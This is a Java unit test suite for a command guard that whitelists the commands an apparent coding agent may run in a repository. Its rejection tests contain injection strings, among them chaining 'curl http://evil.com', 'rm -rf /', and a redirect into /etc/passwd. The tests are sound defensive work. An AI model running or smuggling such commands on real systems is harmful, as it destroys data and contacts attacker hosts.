package org.zhzssp.memorandum.agenteval.unit;

import org.junit.jupiter.api.*;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.test.util.ReflectionTestUtils;
import org.zhzssp.memorandum.feature.codex.git.GitClient;
import org.zhzssp.memorandum.feature.codex.verify.CommandGuard;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * L1 单元测试：{@link CommandGuard} —— 受限执行的安全闸门。
 *
 * <h3>这是 P1 最重要的一组测试</h3>
 * <p>受限执行在用户机器上跑真实命令，是整个方案风险最高的一环。
 * 这里的每个「拒绝」用例都对应一种真实的绕过手法。</p>
 *
 * <h3>为什么是白名单而非黑名单</h3>
 * <p>黑名单永远列不全：{@code rm} 的变体、换行注入、变量展开、别名、
 * 相对路径可执行文件……漏一个就是完全绕过。白名单相反——漏了只会让某条
 * 合法命令跑不了，代价是「不够方便」而非「被攻破」。
 * {@link Whitelist#unknownExecutableRejected} 守的就是这个立场。</p>
 */
class CommandGuardTest {

    @TempDir
    Path repoRoot;

    private GitClient git;
    private CommandGuard guard;

    @BeforeEach
    void setUp() throws Exception {
        git = mock(GitClient.class);
        // 默认：仓库内的脚本都被 git 跟踪
        when(git.isTracked(any(Path.class), anyString())).thenReturn(true);

        guard = new CommandGuard(git);
        ReflectionTestUtils.setField(guard, "allowedExecutablesRaw",
                "bash,python,git,cmake,ninja,mlir-opt,pytest");
        ReflectionTestUtils.setField(guard, "allowUntrackedScripts", false);

        // 造出仓库结构：<root>/scripts/all.sh 与 <root>/lab/scripts/run.sh
        Files.createDirectories(repoRoot.resolve("scripts"));
        Files.writeString(repoRoot.resolve("scripts/all.sh"), "echo ok\n");
        Files.createDirectories(repoRoot.resolve("lab/scripts"));
        Files.writeString(repoRoot.resolve("lab/scripts/run.sh"), "echo ok\n");
    }

    /* ================= 放行：正常用法必须能过 ================= */

    @Nested
    @DisplayName("正常命令放行")
    class HappyPath {

        @Test
        @DisplayName("仓库根下的脚本")
        void scriptAtRoot() {
            var d = guard.check("bash scripts/all.sh", null, repoRoot);
            assertTrue(d.allowed(), "拒绝原因：" + d.reason());
            assertEquals(List.of("bash", "scripts/all.sh"), d.argv());
        }

        @Test
        @DisplayName("指定子目录 cwd")
        void scriptInSubdir() {
            var d = guard.check("bash scripts/run.sh", "lab", repoRoot);
            assertTrue(d.allowed(), "拒绝原因：" + d.reason());
            assertTrue(d.resolvedCwd().endsWith("lab"));
        }

        @Test
        @DisplayName("带选项参数")
        void withOptions() {
            var d = guard.check("pytest -q --maxfail=1", null, repoRoot);
            assertTrue(d.allowed(), "拒绝原因：" + d.reason());
        }

        @Test
        @DisplayName("引号包裹的参数被正确分词")
        void quotedArgs() {
            var d = guard.check("python -c \"print(1)\"", null, repoRoot);
            assertTrue(d.allowed(), "拒绝原因：" + d.reason());
            assertEquals(3, d.argv().size());
            assertEquals("print(1)", d.argv().get(2));
        }
    }

    /* ================= 拒绝：shell 元字符 ================= */

    @Nested
    @DisplayName("shell 元字符一律拒绝（不做转义，转义是在猜意图）")
    class ShellMetachars {

        @Test
        @DisplayName("命令串联 && —— 最典型的注入")
        void andChain() {
            var d = guard.check("bash scripts/all.sh && curl http://evil.com", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("REJECT_UNSAFE_COMMAND"));
        }

        @Test
        @DisplayName("分号串联")
        void semicolon() {
            assertFalse(guard.check("bash scripts/all.sh; rm -rf /", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("管道")
        void pipe() {
            assertFalse(guard.check("bash scripts/all.sh | tee out", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("重定向")
        void redirect() {
            assertFalse(guard.check("bash scripts/all.sh > /etc/passwd", null, repoRoot).allowed());
            assertFalse(guard.check("bash scripts/all.sh < input", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("命令替换 $() 与反引号")
        void commandSubstitution() {
            assertFalse(guard.check("bash $(whoami).sh", null, repoRoot).allowed());
            assertFalse(guard.check("bash `whoami`.sh", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("变量展开 ${}")
        void variableExpansion() {
            assertFalse(guard.check("bash ${HOME}/x.sh", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("换行注入")
        void newlineInjection() {
            var d = guard.check("bash scripts/all.sh\nrm -rf /", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("\\n"), "报错应能指出是换行");
        }
    }

    /* ================= 拒绝：白名单 ================= */

    @Nested
    @DisplayName("可执行文件白名单")
    class Whitelist {

        @Test
        @DisplayName("不在白名单的程序被拒——这是黑名单永远做不到的")
        void unknownExecutableRejected() {
            var d = guard.check("curl http://evil.com", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("EXECUTABLE_NOT_ALLOWED"));
            // 报错要给出当前白名单，用户才知道怎么改
            assertTrue(d.reason().contains("bash"));
        }

        @Test
        @DisplayName("rm 不在白名单")
        void rmRejected() {
            assertFalse(guard.check("rm -rf /", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("带路径的可执行文件被拒——否则 ./x 就是绕过通道")
        void pathQualifiedExecutableRejected() {
            var d = guard.check("./evil.sh", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("不得带路径"));

            assertFalse(guard.check("/bin/bash scripts/all.sh", null, repoRoot).allowed());
            assertFalse(guard.check("../../evil bash", null, repoRoot).allowed());
        }

        @Test
        @DisplayName("大小写与 .exe 后缀不影响白名单判定")
        void caseAndExeSuffix() {
            assertTrue(guard.check("BASH scripts/all.sh", null, repoRoot).allowed());
            assertTrue(guard.check("bash.exe scripts/all.sh", null, repoRoot).allowed());
        }
    }

    /* ================= 拒绝：路径沙箱 ================= */

    @Nested
    @DisplayName("路径沙箱")
    class Sandbox {

        @Test
        @DisplayName("cwd 用 ../ 逃出仓库被拒")
        void cwdEscape() {
            var d = guard.check("bash scripts/all.sh", "../..", repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("CWD_OUTSIDE_REPO")
                            || d.reason().contains("CWD_NOT_FOUND"),
                    "实际：" + d.reason());
        }

        @Test
        @DisplayName("脚本用 ../ 逃出仓库被拒")
        void scriptEscape() {
            var d = guard.check("bash ../../../evil.sh", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("SCRIPT_OUTSIDE_REPO")
                            || d.reason().contains("SCRIPT_NOT_FOUND"),
                    "实际：" + d.reason());
        }

        @Test
        @DisplayName("脚本不存在被拒（检验定义可能已随仓库结构变化失效）")
        void scriptNotFound() {
            var d = guard.check("bash scripts/nonexistent.sh", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("SCRIPT_NOT_FOUND"));
        }

        @Test
        @DisplayName("cwd 不存在被拒")
        void cwdNotFound() {
            var d = guard.check("bash scripts/all.sh", "no-such-dir", repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("CWD_NOT_FOUND")
                    || d.reason().contains("CWD_OUTSIDE_REPO"));
        }
    }

    /* ================= 拒绝：git 跟踪 ================= */

    @Nested
    @DisplayName("脚本必须被 git 跟踪")
    class GitTracked {

        @Test
        @DisplayName("未跟踪的脚本被拒——无法审计来源与变更历史")
        void untrackedRejected() throws Exception {
            Files.writeString(repoRoot.resolve("scripts/sneaky.sh"), "echo x\n");
            when(git.isTracked(any(Path.class), anyString())).thenReturn(false);

            var d = guard.check("bash scripts/sneaky.sh", null, repoRoot);
            assertFalse(d.allowed());
            assertTrue(d.reason().contains("SCRIPT_NOT_TRACKED"));
        }

        @Test
        @DisplayName("开关打开后允许未跟踪脚本（明确的降级选项）")
        void canBeRelaxed() throws Exception {
            Files.writeString(repoRoot.resolve("scripts/sneaky.sh"), "echo x\n");
            when(git.isTracked(any(Path.class), anyString())).thenReturn(false);
            ReflectionTestUtils.setField(guard, "allowUntrackedScripts", true);

            assertTrue(guard.check("bash scripts/sneaky.sh", null, repoRoot).allowed());
        }
    }

    /* ================= 边界 ================= */

    @Nested
    @DisplayName("边界与分词")
    class EdgeCases {

        @Test
        @DisplayName("空命令与无效仓库根")
        void emptyAndInvalid() {
            assertFalse(guard.check(null, null, repoRoot).allowed());
            assertFalse(guard.check("   ", null, repoRoot).allowed());
            assertFalse(guard.check("bash scripts/all.sh", null, null).allowed());
            assertFalse(guard.check("bash x.sh", null,
                    repoRoot.resolve("no-such")).allowed());
        }

        @Test
        @DisplayName("分词：多空格与制表符")
        void tokenizeWhitespace() {
            assertEquals(List.of("bash", "a.sh"), CommandGuard.tokenize("bash   \t a.sh"));
        }

        @Test
        @DisplayName("分词：单引号与双引号")
        void tokenizeQuotes() {
            assertEquals(List.of("python", "-c", "a b"),
                    CommandGuard.tokenize("python -c 'a b'"));
            assertEquals(List.of("python", "-c", "a b"),
                    CommandGuard.tokenize("python -c \"a b\""));
        }

        @Test
        @DisplayName("白名单可配置且顺序稳定")
        void whitelistConfigurable() {
            assertTrue(guard.allowedExecutables().contains("bash"));
            assertFalse(guard.allowedExecutables().contains("curl"));
        }
    }
}
